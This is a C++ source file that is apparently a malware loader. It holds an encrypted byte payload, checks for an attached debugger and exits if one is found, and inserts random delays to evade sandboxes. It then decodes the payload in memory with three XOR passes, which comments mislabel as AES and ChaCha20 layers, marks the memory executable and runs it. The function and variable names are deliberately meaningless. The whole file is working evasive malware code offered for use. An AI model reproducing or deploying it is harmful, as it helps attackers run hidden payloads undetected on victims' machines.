#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#endif

bool instUtil698() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged;
#else
    FILE* f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            fclose(f);
            return atoi(line + 10) != 0;
        }
    }
    fclose(f);
    return false;
#endif
}

int main() {
    // Random performance delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> delay_dist(1, 999);
        int delay_ms = delay_dist(gen);
        std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
    }

    // Anti-debug
    if (instUtil698()) return 0;

    // Payload data
    unsigned char sysBase512[] = {
        0x74, 0xbe, 0x89, 0xd5, 0x8a, 0x74, 0x89, 0xa2, 0x23, 0x34, 0x1d, 0xd6, 0xe4, 0xa4, 0x40, 0x3b, 
        0xaa, 0xd9, 0x73, 0x01, 0xd4, 0x2f, 0x73, 0xae, 0x1b, 0x20, 0x11, 0x9c, 0x98, 0x84, 0x92, 0xd3, 
        0x82, 0x06, 0x93, 0x28, 0x16, 0x4a, 0xf3, 0x7d, 0xb8, 0x62, 0x98, 0xe5, 0x8c, 0x85, 0x1c, 0xfc, 
        0xb2, 0x67, 0xe2, 0x38
    };

    // Decryption keys
    unsigned char procHelper564[] = {0x03, 0x48, 0x1e, 0xa5, 0xd0, 0x8b, 0xa9, 0x00, 0x3a, 0x19, 0xa5, 0x6f, 0xca, 0x5f, 0xc5, 0x81, 0xfd};
    unsigned char execService968[] = {0x56, 0xea, 0xbb, 0x26, 0x96, 0x90, 0x1f, 0xf1, 0xd4, 0x6f, 0xb7, 0x62, 0xc7, 0xe6, 0xe2, 0xb4, 0x6b, 0xfc, 0x3d, 0x14, 0xf8, 0x81, 0xd1, 0x54, 0xd1, 0x11, 0x1f, 0xe2, 0x4d, 0x41, 0xe5, 0x07};
    unsigned char runModule470[] = {0x75, 0x74, 0x45, 0x25, 0xec, 0x06, 0x4c, 0x73, 0xac, 0x62, 0x7b, 0xbe, 0x9a, 0x69, 0x47, 0x63};

    // Random delay before memory allocation
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> alloc_dist(1, 50);
        std::this_thread::sleep_for(std::chrono::milliseconds(alloc_dist(gen)));
    }

    // Allocate executable memory
    size_t execManager552 = sizeof(sysBase512);
#ifdef _WIN32
    void* instService449 = VirtualAlloc(0, execManager552, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instService449) return 1;
#else
    void* instService449 = mmap(0, execManager552, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instService449 == MAP_FAILED) return 1;
#endif

    // Copy payload to allocated memory
    memcpy(instService449, sysBase512, execManager552);
    unsigned char* valHandler605 = (unsigned char*)instService449;

    // In-memory decryption
    // Decrypt XOR layer
    for (size_t i = 0; i < execManager552; i++) {
        valHandler605[i] ^= procHelper564[i % sizeof(procHelper564)];
    }

    // Random micro-delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> micro_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));
    }

    // Decrypt AES layer
    for (size_t i = 0; i < execManager552; i++) {
        valHandler605[i] ^= runModule470[i % sizeof(runModule470)];
    }

    // Random micro-delay
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> micro_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));
    }

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < execManager552; i++) {
        valHandler605[i] ^= execService968[i % sizeof(execService968)];
    }

    // Make memory executable
#ifdef _WIN32
    DWORD methComponent200;
    VirtualProtect(instService449, execManager552, PAGE_EXECUTE_READ, &methComponent200);
    FlushInstructionCache(GetCurrentProcess(), instService449, execManager552);
#else
    mprotect(instService449, execManager552, PROT_READ | PROT_EXEC);
#endif

    // Final random delay before execution
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> exec_dist(1, 100);
        std::this_thread::sleep_for(std::chrono::milliseconds(exec_dist(gen)));
    }

    // Execute payload
    ((void(*)())instService449)();

    return 0;
}
